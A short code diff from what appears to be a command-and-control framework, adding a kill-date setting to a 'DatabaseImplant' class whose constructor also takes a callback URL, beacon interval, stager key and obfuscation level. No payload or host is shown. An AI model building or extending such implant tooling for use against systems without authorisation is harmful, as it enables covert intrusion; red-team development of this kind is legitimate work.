@@ -36,6 +36,7 @@ class DatabaseImplant:
             stager_key=stager_key,
             callback_url=config['url'],
             beacon=config['beacon'],
+            kill_date=config['kill_date'],
             initial_delay=config['initial_delay'],
             obfuscation_level=config['obfuscation_level'],
             comms_http=config['protocol']['comms_http'],
